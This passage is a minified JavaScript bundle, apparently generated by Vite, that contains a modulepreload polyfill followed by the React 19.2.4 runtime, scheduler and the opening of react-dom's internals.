(function(){const B=document.createElement("link").relList;if(B&&B.supports&&B.supports("modulepreload"))return;for(const H of document.querySelectorAll('link[rel="modulepreload"]'))m(H);new MutationObserver(H=>{for(const J of H)if(J.type==="childList")for(const ce of J.addedNodes)ce.tagName==="LINK"&&ce.rel==="modulepreload"&&m(ce)}).observe(document,{childList:!0,subtree:!0});function X(H){const J={};return H.integrity&&(J.integrity=H.integrity),H.referrerPolicy&&(J.referrerPolicy=H.referrerPolicy),H.crossOrigin==="use-credentials"?J.credentials="include":H.crossOrigin==="anonymous"?J.credentials="omit":J.credentials="same-origin",J}function m(H){if(H.ep)return;H.ep=!0;const J=X(H);fetch(H.href,J)}})();var Xu={exports:{}},ti={};var Pf;function _p(){if(Pf)return ti;Pf=1;var w=Symbol.for("react.transitional.element"),B=Symbol.for("react.fragment");function X(m,H,J){var ce=null;if(J!==void 0&&(ce=""+J),H.key!==void 0&&(ce=""+H.key),"key"in H){J={};for(var Me in H)Me!=="key"&&(J[Me]=H[Me])}else J=H;return H=J.ref,{$$typeof:w,type:m,key:ce,ref:H!==void 0?H:null,props:J}}return ti.Fragment=B,ti.jsx=X,ti.jsxs=X,ti}var eh;function Hp(){return eh||(eh=1,Xu.exports=_p()),Xu.exports}var s=Hp(),Qu={exports:{}},te={};var th;function Rp(){if(th)return te;th=1;var w=Symbol.for("react.transitional.element"),B=Symbol.for("react.portal"),X=Symbol.for("react.fragment"),m=Symbol.for("react.strict_mode"),H=Symbol.for("react.profiler"),J=Symbol.for("react.consumer"),ce=Symbol.for("react.context"),Me=Symbol.for("react.forward_ref"),q=Symbol.for("react.suspense"),j=Symbol.for("react.memo"),ue=Symbol.for("react.lazy"),Q=Symbol.for("react.activity"),Ne=Symbol.iterator;function se(d){return d===null||typeof d!="object"?null:(d=Ne&&d[Ne]||d["@@iterator"],typeof d=="function"?d:null)}var Ge={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Ve=Object.assign,mt={};function ve(d,T,z){this.props=d,this.context=T,this.refs=mt,this.updater=z||Ge}ve.prototype.isReactComponent={},ve.prototype.setState=function(d,T){if(typeof d!="object"&&typeof d!="function"&&d!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,d,T,"setState")},ve.prototype.forceUpdate=function(d){this.updater.enqueueForceUpdate(this,d,"forceUpdate")};function st(){}st.prototype=ve.prototype;function G(d,T,z){this.props=d,this.context=T,this.refs=mt,this.updater=z||Ge}var tt=G.prototype=new st;tt.constructor=G,Ve(tt,ve.prototype),tt.isPureReactComponent=!0;var O=Array.isArray;function R(){}var D={H:null,A:null,T:null,S:null},_=Object.prototype.hasOwnProperty;function Ze(d,T,z){var L=z.ref;return{$$typeof:w,type:d,key:T,ref:L!==void 0?L:null,props:z}}function _e(d,T){return Ze(d.type,T,d.props)}function dt(d){return typeof d=="object"&&d!==null&&d.$$typeof===w}function ye(d){var T={"=":"=0",":":"=2"};return"$"+d.replace(/[=:]/g,function(z){return T[z]})}var De=/\/+/g;function We(d,T){return typeof d=="object"&&d!==null&&d.key!=null?ye(""+d.key):T.toString(36)}function Ce(d){switch(d.status){case"fulfilled":return d.value;case"rejected":throw d.reason;default:switch(typeof d.status=="string"?d.then(R,R):(d.status="pending",d.then(function(T){d.status==="pending"&&(d.status="fulfilled",d.value=T)},function(T){d.status==="pending"&&(d.status="rejected",d.reason=T)})),d.status){case"fulfilled":return d.value;case"rejected":throw d.reason}}throw d}function b(d,T,z,L,P){var ie=typeof d;(ie==="undefined"||ie==="boolean")&&(d=null);var re=!1;if(d===null)re=!0;else switch(ie){case"bigint":case"string":case"number":re=!0;break;case"object":switch(d.$$typeof){case w:case B:re=!0;break;case ue:return re=d._init,b(re(d._payload),T,z,L,P)}}if(re)return P=P(d),re=L===""?"."+We(d,0):L,O(P)?(z="",re!=null&&(z=re.replace(De,"$&/")+"/"),b(P,T,z,"",function(_t){return _t})):P!=null&&(dt(P)&&(P=_e(P,z+(P.key==null||d&&d.key===P.key?"":(""+P.key).replace(De,"$&/")+"/")+re)),T.push(P)),1;re=0;var at=L===""?".":L+":";if(O(d))for(var xe=0;xe<d.length;xe++)L=d[xe],ie=at+We(L,xe),re+=b(L,T,z,ie,P);else if(xe=se(d),typeof xe=="function")for(d=xe.call(d),xe=0;!(L=d.next()).done;)L=L.value,ie=at+We(L,xe++),re+=b(L,T,z,ie,P);else if(ie==="object"){if(typeof d.then=="function")return b(Ce(d),T,z,L,P);throw T=String(d),Error("Objects are not valid as a React child (found: "+(T==="[object Object]"?"object with keys {"+Object.keys(d).join(", ")+"}":T)+"). If you meant to render a collection of children, use an array instead.")}return re}function k(d,T,z){if(d==null)return d;var L=[],P=0;return b(d,L,"","",function(ie){return T.call(z,ie,P++)}),L}function Z(d){if(d._status===-1){var T=d._result;T=T(),T.then(function(z){(d._status===0||d._status===-1)&&(d._status=1,d._result=z)},function(z){(d._status===0||d._status===-1)&&(d._status=2,d._result=z)}),d._status===-1&&(d._status=0,d._result=T)}if(d._status===1)return d._result.default;throw d._result}var I=typeof reportError=="function"?reportError:function(d){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var T=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof d=="object"&&d!==null&&typeof d.message=="string"?String(d.message):String(d),error:d});if(!window.dispatchEvent(T))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",d);return}console.error(d)},oe={map:k,forEach:function(d,T,z){k(d,function(){T.apply(this,arguments)},z)},count:function(d){var T=0;return k(d,function(){T++}),T},toArray:function(d){return k(d,function(T){return T})||[]},only:function(d){if(!dt(d))throw Error("React.Children.only expected to receive a single React element child.");return d}};return te.Activity=Q,te.Children=oe,te.Component=ve,te.Fragment=X,te.Profiler=H,te.PureComponent=G,te.StrictMode=m,te.Suspense=q,te.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=D,te.__COMPILER_RUNTIME={__proto__:null,c:function(d){return D.H.useMemoCache(d)}},te.cache=function(d){return function(){return d.apply(null,arguments)}},te.cacheSignal=function(){return null},te.cloneElement=function(d,T,z){if(d==null)throw Error("The argument must be a React element, but you passed "+d+".");var L=Ve({},d.props),P=d.key;if(T!=null)for(ie in T.key!==void 0&&(P=""+T.key),T)!_.call(T,ie)||ie==="key"||ie==="__self"||ie==="__source"||ie==="ref"&&T.ref===void 0||(L[ie]=T[ie]);var ie=arguments.length-2;if(ie===1)L.children=z;else if(1<ie){for(var re=Array(ie),at=0;at<ie;at++)re[at]=arguments[at+2];L.children=re}return Ze(d.type,P,L)},te.createContext=function(d){return d={$$typeof:ce,_currentValue:d,_currentValue2:d,_threadCount:0,Provider:null,Consumer:null},d.Provider=d,d.Consumer={$$typeof:J,_context:d},d},te.createElement=function(d,T,z){var L,P={},ie=null;if(T!=null)for(L in T.key!==void 0&&(ie=""+T.key),T)_.call(T,L)&&L!=="key"&&L!=="__self"&&L!=="__source"&&(P[L]=T[L]);var re=arguments.length-2;if(re===1)P.children=z;else if(1<re){for(var at=Array(re),xe=0;xe<re;xe++)at[xe]=arguments[xe+2];P.children=at}if(d&&d.defaultProps)for(L in re=d.defaultProps,re)P[L]===void 0&&(P[L]=re[L]);return Ze(d,ie,P)},te.createRef=function(){return{current:null}},te.forwardRef=function(d){return{$$typeof:Me,render:d}},te.isValidElement=dt,te.lazy=function(d){return{$$typeof:ue,_payload:{_status:-1,_result:d},_init:Z}},te.memo=function(d,T){return{$$typeof:j,type:d,compare:T===void 0?null:T}},te.startTransition=function(d){var T=D.T,z={};D.T=z;try{var L=d(),P=D.S;P!==null&&P(z,L),typeof L=="object"&&L!==null&&typeof L.then=="function"&&L.then(R,I)}catch(ie){I(ie)}finally{T!==null&&z.types!==null&&(T.types=z.types),D.T=T}},te.unstable_useCacheRefresh=function(){return D.H.useCacheRefresh()},te.use=function(d){return D.H.use(d)},te.useActionState=function(d,T,z){return D.H.useActionState(d,T,z)},te.useCallback=function(d,T){return D.H.useCallback(d,T)},te.useContext=function(d){return D.H.useContext(d)},te.useDebugValue=function(){},te.useDeferredValue=function(d,T){return D.H.useDeferredValue(d,T)},te.useEffect=function(d,T){return D.H.useEffect(d,T)},te.useEffectEvent=function(d){return D.H.useEffectEvent(d)},te.useId=function(){return D.H.useId()},te.useImperativeHandle=function(d,T,z){return D.H.useImperativeHandle(d,T,z)},te.useInsertionEffect=function(d,T){return D.H.useInsertionEffect(d,T)},te.useLayoutEffect=function(d,T){return D.H.useLayoutEffect(d,T)},te.useMemo=function(d,T){return D.H.useMemo(d,T)},te.useOptimistic=function(d,T){return D.H.useOptimistic(d,T)},te.useReducer=function(d,T,z){return D.H.useReducer(d,T,z)},te.useRef=function(d){return D.H.useRef(d)},te.useState=function(d){return D.H.useState(d)},te.useSyncExternalStore=function(d,T,z){return D.H.useSyncExternalStore(d,T,z)},te.useTransition=function(){return D.H.useTransition()},te.version="19.2.4",te}var ah;function co(){return ah||(ah=1,Qu.exports=Rp()),Qu.exports}var $=co(),Ku={exports:{}},ai={},Zu={exports:{}},Wu={};var lh;function Lp(){return lh||(lh=1,(function(w){function B(b,k){var Z=b.length;b.push(k);e:for(;0<Z;){var I=Z-1>>>1,oe=b[I];if(0<H(oe,k))b[I]=k,b[Z]=oe,Z=I;else break e}}function X(b){return b.length===0?null:b[0]}function m(b){if(b.length===0)return null;var k=b[0],Z=b.pop();if(Z!==k){b[0]=Z;e:for(var I=0,oe=b.length,d=oe>>>1;I<d;){var T=2*(I+1)-1,z=b[T],L=T+1,P=b[L];if(0>H(z,Z))L<oe&&0>H(P,z)?(b[I]=P,b[L]=Z,I=L):(b[I]=z,b[T]=Z,I=T);else if(L<oe&&0>H(P,Z))b[I]=P,b[L]=Z,I=L;else break e}}return k}function H(b,k){var Z=b.sortIndex-k.sortIndex;return Z!==0?Z:b.id-k.id}if(w.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var J=performance;w.unstable_now=function(){return J.now()}}else{var ce=Date,Me=ce.now();w.unstable_now=function(){return ce.now()-Me}}var q=[],j=[],ue=1,Q=null,Ne=3,se=!1,Ge=!1,Ve=!1,mt=!1,ve=typeof setTimeout=="function"?setTimeout:null,st=typeof clearTimeout=="function"?clearTimeout:null,G=typeof setImmediate<"u"?setImmediate:null;function tt(b){for(var k=X(j);k!==null;){if(k.callback===null)m(j);else if(k.startTime<=b)m(j),k.sortIndex=k.expirationTime,B(q,k);else break;k=X(j)}}function O(b){if(Ve=!1,tt(b),!Ge)if(X(q)!==null)Ge=!0,R||(R=!0,ye());else{var k=X(j);k!==null&&Ce(O,k.startTime-b)}}var R=!1,D=-1,_=5,Ze=-1;function _e(){return mt?!0:!(w.unstable_now()-Ze<_)}function dt(){if(mt=!1,R){var b=w.unstable_now();Ze=b;var k=!0;try{e:{Ge=!1,Ve&&(Ve=!1,st(D),D=-1),se=!0;var Z=Ne;try{t:{for(tt(b),Q=X(q);Q!==null&&!(Q.expirationTime>b&&_e());){var I=Q.callback;if(typeof I=="function"){Q.callback=null,Ne=Q.priorityLevel;var oe=I(Q.expirationTime<=b);if(b=w.unstable_now(),typeof oe=="function"){Q.callback=oe,tt(b),k=!0;break t}Q===X(q)&&m(q),tt(b)}else m(q);Q=X(q)}if(Q!==null)k=!0;else{var d=X(j);d!==null&&Ce(O,d.startTime-b),k=!1}}break e}finally{Q=null,Ne=Z,se=!1}k=void 0}}finally{k?ye():R=!1}}}var ye;if(typeof G=="function")ye=function(){G(dt)};else if(typeof MessageChannel<"u"){var De=new MessageChannel,We=De.port2;De.port1.onmessage=dt,ye=function(){We.postMessage(null)}}else ye=function(){ve(dt,0)};function Ce(b,k){D=ve(function(){b(w.unstable_now())},k)}w.unstable_IdlePriority=5,w.unstable_ImmediatePriority=1,w.unstable_LowPriority=4,w.unstable_NormalPriority=3,w.unstable_Profiling=null,w.unstable_UserBlockingPriority=2,w.unstable_cancelCallback=function(b){b.callback=null},w.unstable_forceFrameRate=function(b){0>b||125<b?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):_=0<b?Math.floor(1e3/b):5},w.unstable_getCurrentPriorityLevel=function(){return Ne},w.unstable_next=function(b){switch(Ne){case 1:case 2:case 3:var k=3;break;default:k=Ne}var Z=Ne;Ne=k;try{return b()}finally{Ne=Z}},w.unstable_requestPaint=function(){mt=!0},w.unstable_runWithPriority=function(b,k){switch(b){case 1:case 2:case 3:case 4:case 5:break;default:b=3}var Z=Ne;Ne=b;try{return k()}finally{Ne=Z}},w.unstable_scheduleCallback=function(b,k,Z){var I=w.unstable_now();switch(typeof Z=="object"&&Z!==null?(Z=Z.delay,Z=typeof Z=="number"&&0<Z?I+Z:I):Z=I,b){case 1:var oe=-1;break;case 2:oe=250;break;case 5:oe=1073741823;break;case 4:oe=1e4;break;default:oe=5e3}return oe=Z+oe,b={id:ue++,callback:k,priorityLevel:b,startTime:Z,expirationTime:oe,sortIndex:-1},Z>I?(b.sortIndex=Z,B(j,b),X(q)===null&&b===X(j)&&(Ve?(st(D),D=-1):Ve=!0,Ce(O,Z-I))):(b.sortIndex=oe,B(q,b),Ge||se||(Ge=!0,R||(R=!0,ye()))),b},w.unstable_shouldYield=_e,w.unstable_wrapCallback=function(b){var k=Ne;return function(){var Z=Ne;Ne=k;try{return b.apply(this,arguments)}finally{Ne=Z}}}})(Wu)),Wu}var nh;function Up(){return nh||(nh=1,Zu.exports=Lp()),Zu.exports}var Ju={exports:{}},ht={};var ih;function Bp(){if(ih)return ht;ih=1;var w=co();function B(q){var j="https://react.dev/errors/"+q;if(1<arguments.length){j+="?args[]="+encodeURIComponent(arguments[1]);for(var ue=2;ue<arguments.length;ue++)j+="&args[]="+encodeURIComponent(arguments[ue])}return"Minified React error #"+q+"; visit "+j+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function X(){}var m={d:{f:X,r:function(){throw Error(B(522))},D:X,C:X,L:X,m:X,X,S:X,M:X},p:0,findDOMNode:null},H=Symbol.for("react.portal");function J(q,j,ue){var Q=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:H,key:Q==null?null:""+Q,children:q,containerInfo:j,implementation:ue}}var ce=w.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function Me(q,j){if(q==="font")return"";if(typeof j=="string")return j==="use-credentials"?j:""}return ht.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=m,ht.createPortal=function(q,j){var ue=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!j||j.nodeType!==1&&j.nodeType!==9&&j.nodeType!==11)throw Error(B(299));return J(q,j,null,ue)},ht.flushSync=function(q){var j=ce.T,ue=m.p;try{if(ce.T=null,m.p=2,q)return q()}finally{ce.T=j,m.p=ue,m.d.f()}},ht.preconnect=function(q,j){typeof q=="string"&&(j?(j=j.crossOrigin,j=typeof j=="string"?j==="use-credentials"?j:"":void 0):j=null,m.d.C(q,j))},ht.prefetchDNS=function(q){typeof q=="string"&&m.d.D(q)},ht.preinit=function(q,j){if(typeof q=="string"&&j&&typeof j.as=="string"){var ue=j.as,Q=Me(ue,j.crossOrigin),Ne=typeof j.integrity=="string"?j.integrity:void 0,se=typeof j.fetchPriority=="string"?j.fetchPriority:void 0;ue==="style"?m.d.S(q,typeof j.precedence=="string"?j.precedence:void 0,{crossOrigin:Q,integrity:Ne,fetchPriority:se}):ue==="script"&&m.d.X(q,{crossOrigin:Q,integrity:Ne,fetchPriority:se,nonce:typeof j.nonce=="string"?j.nonce:void 0})}},ht.preinitModule=function(q,j){if(typeof q=="string")if(typeof j=="object"&&j!==null){if(j.as==null||j.as==="script"){var ue=Me(j.as,j.crossOrigin);m.d.M(q,{crossOrigin:ue,integrity:typeof j.integrity=="string"?j.integrity:void 0,nonce:typeof j.nonce=="string"?j.nonce:void 0})}}else j==null&&m.d.M(q)},ht.preload=function(q,j){if(typeof q=="string"&&typeof j=="object"&&j!==null&&typeof j.as=="string"){var ue=j.as,Q=Me(ue,j.crossOrigin);m.d.L(q,ue,{crossOrigin:Q,integrity:typeof j.integrity=="string"?j.integrity:void 0,nonce:typeof j.nonce=="string"?j.nonce:void 0,type:typeof j.type=="string"?j.type:void 0,fetchPriority:typeof j.fetchPriority=="string"?j.fetchPriority:void 0,referrerPolicy:typeof j.referrerPolicy=="string"?j.referrerPolicy:void 0,imageSrcSet:typeof j.imageSrcSet=="string"?j.imageSrcSet:void 0,imageSizes:typeof j.imageSizes=="string"?j.imageSizes:void 0,media:typeof j.media=="string"?j.media:void 0})}},ht.preloadModule=function(q,j){if(typeof q=="string")if(j){var ue=Me(j.as,j.crossOrigin);m.d.m(q,{as:typeof j.as=="string"&&j.as!=="script"?j.as:void 0,crossOrigin:ue,integrity:typeof j.integrity=="string"?j.integrity:void 0})}else m.d.m(q)},ht.requestFormReset=function(q){m.d.r(q)},ht.unstable_batchedUpdates=function(q,j){return q(j)},ht.useFormState=function(q,j,ue){return ce.H.useFormState(q,j,ue)},ht.useFormStatus=function(){return ce.H.useHostTransitionStatus()},ht.version="19.2.4",ht}var sh;function Yp(){if(sh)return Ju.exports;sh=1;function w(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(w)}catch(B){console.error(B)}}return w(),Ju.exports=Bp(),Ju.exports}var ch;function qp(){if(ch)return ai;ch=1;var w=Up(),B=co(),X=Yp();function m(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var a=2;a<arguments.length;a++)t+="&args[]="+encodeURIComponent(arguments[a])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function H(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function J(e){var t=e,a=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(a=t.return),e=t.return;while(e)}return t.tag===3?a:null}function ce(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Me(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function q(e){if(J(e)!==e)throw Error(m(188))}function j(e){var t=e.alternate;if(!t){if(t=J(e),t===null)throw Error(m(188));return t!==e?null:e}for(var a=e,l=t;;){var n=a.return;if(n===null)break;var i=n.alternate;if(i===null){if(l=n.return,l!==null){a=l;continue}break}if(n.child===i.child){for(i=n.child;i;){if(i===a)return q(n),e;if(i===l)return q(n),t;i=i.sibling}throw Error(m(188))}if(a.return!==l.return)a=n,l=i;else{for(var c=!1,u=n.child;u;){if(u===a){c=!0,a=n,l=i;break}if(u===l){c=!0,l=n,a=i;break}u=u.sibling}if(!c){for(u=i.child;u;){if(u===a){c=!0,a=i,l=n;break}if(u===l){c=!0,l=i,a=n;break}u=u.sibling}if(!c)throw Error(m(189))}}if(a.alternate!==l)throw Error(m(190))}if(a.tag!==3)throw Error(m(188));return a.stateNode.current===a?e:t}function ue(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=ue(e),t!==null)return t;e=e.sibling}return null}var Q=Object.assign,Ne=Symbol.for("react.element"),se=Symbol.for("react.transitional.element"),Ge=Symbol.for("react.portal"),Ve=Symbol.for("react.fragment"),mt=Symbol.for("react.strict_mode"),ve=Symbol.for("react.profiler"),st=Symbol.for("react.consumer"),G=Symbol.for("react.context"),tt=Symbol.for("react.forward_ref"),O=Symbol.for("react.suspense"),R=Symbol.for("react.suspense_list"),D=Symbol.for("react.memo"),_=Symbol.for("react.lazy"),Ze=Symbol.for("react.activity"),_e=Symbol.for("react.memo_cache_sentinel"),dt=Symbol.iterator;function ye(e){return e===null||typeof e!="object"?null:(e=dt&&e[dt]||e["@@iterator"],typeof e=="function"?e:null)}var De=Symbol.for("react.client.reference");function We(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===De?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Ve:return"Fragment";case ve:return"Profiler";case mt:return"StrictMode";case O:return"Suspense";case R:return"SuspenseList";case Ze:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case Ge:return"Portal";case G:return e.displayName||"Context";case st:return(e._context.displayName||"Context")+".Consumer";case tt:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case D:return t=e.displayName||null,t!==null?t:We(e.type)||"Memo";case _:t=e._payload,e=e._init;try{return We(e(t))}catch{}}return null}var Ce=Array.isArray,b=B.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,k=X.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,Z={pending:!1,data:null,method:null,action:null},I=[],oe=-1;function d(e){return{current:e}}function T(e){0>oe||(e.current=I[oe],I[oe]=null,oe--)}function z(e,t){oe++,I[oe]=e.current,e.current=t}var L=d(null),P=d(null),ie=d(null),re=d(null);function at(e,t){switch(z(ie,t),z(P,e),z(L,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?Tf(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=Tf(t),e=Nf(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}T(L),z(L,e)}function xe(){T(L),T(P),T(ie)}function _t(e){e.memoizedState!==null&&z(re,e);var t=L.current,a=Nf(t,e.type);t!==a&&(z(P,e),z(L,a))}function aa(e){P.current===e&&(T(L),T(P)),re.current===e&&(T(re),$n._currentValue=Z)}var ja,je;function la(e){if(ja===void 0)try{throw Error()}catch(a){var t=a.stack.trim().match(/\n( *(at )?)/);ja=t&&t[1]||"",je=-1<a.stack.indexOf(`
    at`)?" (<anonymous>)":-1<a.stack.indexOf("@")?"@unknown:0:0":""}return`
`+ja+e+je}var ft=!1;function Jt(e,t){if(!e||ft)return"";ft=!0;var a=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var l={DetermineComponentFrameRoot:function(){try{if(t){var A=function(){throw Error()};if(Object.defineProperty(A.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(A,[])}catch(v){var g=v}Reflect.construct(e,[],A)}else{try{A.call()}catch(v){g=v}e.call(A.prototype)}}else{try{throw Error()}catch(v){g=v}(A=e())&&typeof A.catch=="function"&&A.catch(function(){})}}catch(v){if(v&&g&&typeof v.stack=="string")return[v.stack,g.stack]}return[null,null]}};l.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(l.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(l.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var i=l.DetermineComponentFrameRoot(),c=i[0],u=i[1];if(c&&u){var r=c.split(`
`),y=u.split(`
`);for(n=l=0;l<r.length&&!r[l].includes("DetermineComponentFrameRoot");)l++;for(;n<y.length&&!y[n].includes("DetermineComponentFrameRoot");)n++;if(l===r.length||n===y.length)for(l=r.length-1,n=y.length-1;1<=l&&0<=n&&r[l]!==y[n];)n--;for(;1<=l&&0<=n;l--,n--)if(r[l]!==y[n]){if(l!==1||n!==1)do if(l--,n--,0>n||r[l]!==y[n]){var x=`
`+r[l].replace(" at new "," at ");return e.displayName&&x.includes("<anonymous>")&&(x=x.replace("<anonymous>",e.displayName)),x}while(1<=l&&0<=n);break}}}finally{ft=!1,Error.prepareStackTrace=a}return(a=e?e.displayName||e.name:"")?la(a):""}function Xe(e,t){switch(e.tag){case 26:case 27:case 5:return la(e.type);case 16:return la("Lazy");case 13:return e.child!==t&&t!==null?la("Suspense Fallback"):la("Suspense");case 19:return la("SuspenseList");case 0:case 15:return Jt(e.type,!1);case 11:return Jt(e.type.render,!1);case 1:return Jt(e.type,!0);case 31:return la("Activity");default:return""}}function ee(e){try{var t="",a=null;do t+=Xe(e,a),a=e,e=e.return;while(e);return t}catch(l){return`
Error generating stack: `+l.message+`
`+l.stack}}var gl=Object.prototype.hasOwnProperty,vl=w.unstable_scheduleCallback,rn=w.unstable_cancelCallback,ks=w.unstable_shouldYield,Ms=w.unstable_requestPaint,pt=w.unstable_now,si=w.unstable_getCurrentPriorityLevel,ci=w.unstable_ImmediatePriority,ui=w.unstable_UserBlockingPriority,Sl=w.unstable_NormalPriority,dn=w.unstable_LowPriority,oi=w.unstable_IdlePriority,ri=w.log,di=w.unstable_setDisableYieldValue,Fa=null,yt=null;function Ft(e){if(typeof ri=="function"&&di(e),yt&&typeof yt.setStrictMode=="function")try{yt.setStrictMode(Fa,e)}catch{}}var gt=Math.clz32?Math.clz32:Hs,Ds=Math.log,_s=Math.LN2;function Hs(e){return e>>>=0,e===0?32:31-(Ds(e)/_s|0)|0}var bl=256,xl=262144,Tl=4194304;function na(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Nl(e,t,a){var l=e.pendingLanes;if(l===0)return 0;var n=0,i=e.suspendedLanes,c=e.pingedLanes;e=e.warmLanes;var u=l&134217727;return u!==0?(l=u&~i,l!==0?n=na(l):(c&=u,c!==0?n=na(c):a||(a=u&~e,a!==0&&(n=na(a))))):(u=l&~i,u!==0?n=na(u):c!==0?n=na(c):a||(a=l&~e,a!==0&&(n=na(a)))),n===0?0:t!==0&&t!==n&&(t&i)===0&&(i=n&-n,a=t&-t,i>=a||i===32&&(a&4194048)!==0)?t:n}function $a(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function Rs(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function fi(){var e=Tl;return Tl<<=1,(Tl&62914560)===0&&(Tl=4194304),e}function fn(e){for(var t=[],a=0;31>a;a++)t.push(e);return t}function Ia(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function hn(e,t,a,l,n,i){var c=e.pendingLanes;e.pendingLanes=a,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=a,e.entangledLanes&=a,e.errorRecoveryDisabledLanes&=a,e.shellSuspendCounter=0;var u=e.entanglements,r=e.expirationTimes,y=e.hiddenUpdates;for(a=c&~a;0<a;){var x=31-gt(a),A=1<<x;u[x]=0,r[x]=-1;var g=y[x];if(g!==null)for(y[x]=null,x=0;x<g.length;x++){var v=g[x];v!==null&&(v.lane&=-536870913)}a&=~A}l!==0&&Cl(e,l,0),i!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=i&~(c&~t))}function Cl(e,t,a){e.pendingLanes|=t,e.suspendedLanes&=~t;var l=31-gt(t);e.entangledLanes|=t,e.entanglements[l]=e.entanglements[l]|1073741824|a&261930}function hi(e,t){var a=e.entangledLanes|=t;for(e=e.entanglements;a;){var l=31-gt(a),n=1<<l;n&t|e[l]&t&&(e[l]|=t),a&=~n}}function o(e,t){var a=t&-t;return a=(a&42)!==0?1:N(a),(a&(e.suspendedLanes|t))!==0?0:a}function N(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function S(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function E(){var e=k.p;return e!==0?e:(e=window.event,e===void 0?32:Kf(e.type))}function M(e,t){var a=k.p;try{return k.p=e,t()}finally{k.p=a}}var V=Math.random().toString(36).slice(2),F="__reactFiber$"+V,de="__reactProps$"+V,Le="__reactContainer$"+V,jt="__reactEvents$"+V,Be="__reactListeners$"+V,At="__reactHandles$"+V,mi="__reactResources$"+V,Pa="__reactMarker$"+V;function Pe(e){delete e[F],delete e[de],delete e[jt],delete e[Be],delete e[At]}function lt(e){var t=e[F];if(t)return t;for(var a=e.parentNode;a;){if(t=a[Le]||a[F]){if(a=t.alternate,t.child!==null||a!==null&&a.child!==null)for(e=zf(e);e!==null;){if(a=e[F])return a;e=zf(e)}return t}e=a,a=e.parentNode}return null}function ia(e){if(e=e[F]||e[Le]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function sa(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(m(33))}function jl(e){var t=e[mi];return t||(t=e[mi]={hoistableStyles:new 